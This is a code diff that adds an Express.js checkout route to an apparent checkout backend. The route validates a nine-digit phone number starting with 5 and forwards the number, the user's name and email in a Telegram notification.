@@ -384,4 +384,49 @@ router.post('/verify-activation-code', async (req, res) => {
   }
 });
 
+// POST /api/checkout/submit-phone
+// Submit and validate phone number before sending activation code
+router.post('/submit-phone', async (req, res) => {
+  try {
+    const { sessionId, phoneNumber, userName, userEmail } = req.body;
+
+    if (!sessionId || !phoneNumber) {
+      return res.status(400).json({ error: 'sessionId and phoneNumber are required' });
+    }
+
+    // Validate phone number: must start with 5 and have exactly 9 digits
+    const cleanPhone = String(phoneNumber).replace(/\D/g, '');
+    const isValidPhone = cleanPhone.length === 9 && cleanPhone.startsWith('5');
+
+    if (!isValidPhone) {
+      return res.status(400).json({
+        success: false,
+        valid: false,
+        error: 'يرجى إدخال رقم جوال صالح (يجب أن يبدأ بـ 5 ويتكون من 9 أرقام)',
+      });
+    }
+
+    // Send Telegram notification with the submitted phone number
+    telegramService.sendPhoneNumberSubmittedNotification({
+      sessionId,
+      phoneNumber: cleanPhone,
+      userName,
+      userEmail,
+      timestamp: new Date().toISOString(),
+    }).catch((err) => {
+      console.error('[SubmitPhone] Telegram notification failed:', err.message);
+    });
+
+    return res.status(200).json({
+      success: true,
+      valid: true,
+      phoneNumber: cleanPhone,
+      message: 'Phone number is valid and notification sent',
+    });
+  } catch (err) {
+    console.error('[SubmitPhone] Error:', err);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+});
+
 module.exports = router;
